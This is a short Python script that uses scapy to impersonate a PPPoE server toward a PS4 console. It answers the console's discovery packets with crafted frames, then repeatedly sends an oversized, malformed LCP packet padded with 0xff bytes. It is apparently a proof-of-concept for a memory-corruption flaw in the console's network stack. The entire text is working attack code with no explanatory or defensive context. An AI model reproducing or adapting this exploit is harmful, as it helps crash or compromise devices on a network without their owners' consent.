from scapy.all import PPPoED, Ether, sniff, sendp, srp1, hexdump

source = b"\xXX\xXX\xXX\xXX\xXX\xXX" # MAC address of your adapter on PC
destination = b"\xXX\xXX\xXX\xXX\xXX\xXX" # MAC address of LAN on your PS4
interface = "Realtek PCIe 2.5GbE Family Controller #2" # get via "ipconfig /all" or eth0 or similiar on Linux

packet = sniff(iface=interface, filter="pppoed", count=1)
tag_value = packet[PPPoED][0].tag_list[1].tag_value
payload = destination + source + b"\x88\x63\x11\x07\x00\x00\x00\x0c\x01\x03\x00\x08" + tag_value
sendp(payload, iface=interface)

packet = sniff(iface=interface, filter="pppoed", count=1)
payload = destination + source + b"\x88\x63\x11\x65\x00\x01\x00\x0c\x01\x03\x00\x08" + tag_value
sendp(payload, iface=interface)

packet = sniff(iface=interface, filter="pppoes", count=1)
payload = destination + source + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff"
packet = srp1(Ether(payload), iface=interface)
print(hexdump(packet))

payload = destination + source + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff" + b"\xff" * 256 # this number might be different, just a guess
for i in range(20):
    sendp(payload, iface=interface)